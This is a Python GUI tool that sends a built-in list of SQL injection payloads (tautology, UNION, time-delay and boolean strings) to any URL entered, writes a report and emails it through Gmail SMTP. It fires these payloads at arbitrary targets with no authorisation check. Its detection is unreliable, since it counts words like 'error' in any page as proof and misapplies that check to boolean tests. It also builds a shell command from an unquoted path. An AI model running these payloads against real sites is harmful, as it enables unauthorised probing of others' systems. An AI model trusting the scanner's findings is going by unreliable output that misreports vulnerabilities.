import tkinter as tk
from tkinter import scrolledtext, messagebox
import requests
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time

# Email Configuration (Sender email and password need to be updated by the user)
SENDER_EMAIL = "your_email@gmail.com"  # Replace with your email
SENDER_PASSWORD = "your_app_password"  # Replace with your app password

# SQL Injection Payloads
PAYLOADS = {
    "error_based": [
        "' OR '1'='1", "' OR '1'='1 --", '" OR "1"="1', " OR 1=1", "admin' --", "1' OR 1=1", 
        "1' --", '" --', "' --", "--"
    ],
    "union_based": [
        "' UNION SELECT NULL, NULL --", "' UNION SELECT NULL, NULL, NULL --", "1 UNION SELECT 1,2,3 --"
    ],
    "time_based": [
        "' OR SLEEP(5) --", "' OR 1=1 AND SLEEP(5) --", "'; WAITFOR DELAY '0:0:5' --"
    ],
    "blind_based": [
        "' AND 1=1 --", "' AND 1=2 --"
    ]
}

def check_sql_injection(url):
    vulnerabilities_found = {
        "error_based": False,
        "union_based": False,
        "time_based": False,
        "blind_based": False
    }

    # Helper function to check for SQL errors in response
    def detect_sql_error(response):
        error_keywords = ["syntax", "error", "MySQL", "SQL", "Warning", "database", "could not", "fatal"]
        for keyword in error_keywords:
            if keyword.lower() in response.text.lower():
                return True
        return False

    # Test for Error-based SQL Injection
    for payload in PAYLOADS["error_based"]:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=5)
            print(f"Testing Error-based: {test_url}")  # Debugging log
            if detect_sql_error(response) and response.status_code == 200:
                print(f"Error-based vulnerability found: {test_url}")  # Debugging log
                vulnerabilities_found["error_based"] = True
        except requests.RequestException as e:
            print(f"Error testing URL {test_url}: {e}")  # Debugging log
            continue

    # Test for Union-based SQL Injection
    for payload in PAYLOADS["union_based"]:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=5)
            print(f"Testing Union-based: {test_url}")  # Debugging log
            if detect_sql_error(response) and response.status_code == 200:
                print(f"Union-based vulnerability found: {test_url}")  # Debugging log
                vulnerabilities_found["union_based"] = True
        except requests.RequestException as e:
            print(f"Error testing URL {test_url}: {e}")  # Debugging log
            continue

    # Test for Time-based Blind SQL Injection
    for payload in PAYLOADS["time_based"]:
        test_url = f"{url}{payload}"
        start_time = time.time()
        try:
            response = requests.get(test_url, timeout=5)
            end_time = time.time()
            print(f"Testing Time-based: {test_url}")  # Debugging log
            if (end_time - start_time) > 3 and response.status_code == 200:
                print(f"Time-based vulnerability found: {test_url}")  # Debugging log
                vulnerabilities_found["time_based"] = True
        except requests.RequestException as e:
            print(f"Error testing URL {test_url}: {e}")  # Debugging log
            continue

    # Test for Boolean-based Blind SQL Injection
    for payload in PAYLOADS["blind_based"]:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=5)
            print(f"Testing Blind-based: {test_url}")  # Debugging log
            if detect_sql_error(response) and response.status_code == 200:
                print(f"Blind-based vulnerability found: {test_url}")  # Debugging log
                vulnerabilities_found["blind_based"] = True
        except requests.RequestException as e:
            print(f"Error testing URL {test_url}: {e}")  # Debugging log
            continue

    return vulnerabilities_found

# Function to scan vulnerabilities and generate report
def scan_vulnerabilities():
    target = entry_target.get()  # Get URL from the user input
    recipient_email = entry_recipient_email.get()  # Get recipient email from input
    
    if not target:
        messagebox.showwarning("Input Error", "Please enter a target URL!")
        return
    if not recipient_email:
        messagebox.showwarning("Input Error", "Please enter recipient email!")
        return
    
    text_output.delete("1.0", tk.END)  # Clear previous results
    text_output.insert(tk.END, f"Scanning target: {target}\n\n")

    vulnerabilities = check_sql_injection(target)

    vulnerabilities_found = []
    
    if vulnerabilities["error_based"]:
        vulnerabilities_found.append("Error-based SQL Injection: Vulnerable")
    if vulnerabilities["union_based"]:
        vulnerabilities_found.append("Union-based SQL Injection: Vulnerable")
    if vulnerabilities["time_based"]:
        vulnerabilities_found.append("Time-based Blind SQL Injection: Vulnerable")
    if vulnerabilities["blind_based"]:
        vulnerabilities_found.append("Boolean-based Blind SQL Injection: Vulnerable")

    vulnerability_status = "Not Vulnerable" if not vulnerabilities_found else "Vulnerable"

    if vulnerabilities_found:
        for vuln in vulnerabilities_found:
            text_output.insert(tk.END, f"⚠️ {vuln}\n")
    else:
        text_output.insert(tk.END, "✅ No vulnerabilities found.\n")

    report_path = generate_report(target, vulnerability_status, vulnerabilities_found)
    send_email_report(report_path, recipient_email, text_output)

# Function to generate a report in Notepad
def generate_report(target, status, vulnerabilities_found):
    report_path = os.path.join(os.getcwd(), "sql_injection_report.txt")
    
    with open(report_path, "w") as file:
        file.write(f"SQL Injection Scan Report\n")
        file.write(f"Target URL: {target}\n")
        file.write(f"SQL Injection Vulnerability Status: {status}\n")
        if vulnerabilities_found:
            file.write("Vulnerabilities Found:\n")
            for vuln in vulnerabilities_found:
                file.write(f"- {vuln}\n")
        else:
            file.write("No vulnerabilities found.\n")

    text_output.insert(tk.END, "\nReport saved as sql_injection_report.txt\n")
    messagebox.showinfo("Report Saved", f"Report generated successfully:\n{report_path}")

    # Open the report in Notepad
    os.system(f'notepad {report_path}')
    return report_path

# Function to send email with the report
def send_email_report(filename, recipient_email, output_widget):
    subject = "SQL Injection Scan Report"

    try:
        with open(filename, "r") as f:
            report_content = f.read()

        msg = MIMEMultipart()
        msg["From"] = SENDER_EMAIL
        msg["To"] = recipient_email
        msg["Subject"] = subject
        msg.attach(MIMEText(report_content, "plain"))

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, recipient_email, msg.as_string())

        output_widget.insert(tk.END, "📧 Report sent successfully.\n")
    except Exception as e:
        output_widget.insert(tk.END, f"❌ Error sending email: {e}\n")

# Create GUI window
root = tk.Tk()
root.title("SQL Injection Scanner")
root.geometry("600x400")
root.resizable(False, False)

# UI Components
tk.Label(root, text="Enter Target URL:", font=("Arial", 12)).pack(pady=5)
entry_target = tk.Entry(root, width=50, font=("Arial", 12))
entry_target.pack(pady=5)

tk.Label(root, text="Enter Recipient Email:", font=("Arial", 12)).pack(pady=5)
entry_recipient_email = tk.Entry(root, width=50, font=("Arial", 12))
entry_recipient_email.pack(pady=5)

btn_scan = tk.Button(root, text="Start Scan", font=("Arial", 12), command=scan_vulnerabilities, bg="green", fg="white")
btn_scan.pack(pady=10)

text_output = scrolledtext.ScrolledText(root, width=70, height=10, font=("Arial", 10))
text_output.pack(pady=5)

# Run Tkinter main loop
root.mainloop()
